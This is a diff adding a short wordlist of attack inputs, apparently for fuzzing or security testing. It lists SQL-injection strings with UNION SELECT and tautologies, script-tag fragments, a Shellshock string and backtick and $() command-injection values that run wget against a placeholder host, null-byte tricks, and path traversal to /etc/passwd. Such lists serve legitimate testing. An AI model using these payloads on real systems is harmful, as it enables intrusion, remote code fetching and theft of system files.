@@ -1,0 +1,42 @@
+'
+''
+'''
+''''
+admin' --
+admin' #
+admin' /*
+' OR 2=2 #
+' OR 3=3 --
+' OR 4=4 /*
+' UNION SELECT * FROM sysdatabases; --
+ UNION SELECT * FROM sysdatabases; --
+' UNION SELECT * FROM information_schema.databases; #
+ UNION SELECT * FROM information_schema.databases; #
+; RAISERROR (15600,-1,-1, 'mysp_CreateCustomer');#
+'; RAISERROR (15600,-1,-1, 'mysp_CreateCustomer');#
+<img
+<img src="https://<HOME>" 
+<br />
+<script
+/>
+a
+1
+-1
+0
+False
+True
+() { :; }; /bin/wget <HOME>
+%00
+nofile.php%00
+https://<HOME>/nofile.php%00
+"
+`/bin/wget <HOME>`
+$(/bin/wget <HOME>)
+../../../../../etc/passwd
+../../../../../etc/passwd%00
+..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts
+..\..\..\..\..\..\..\Windows\System32\drivers\etc\hosts%00
+
+
+
+
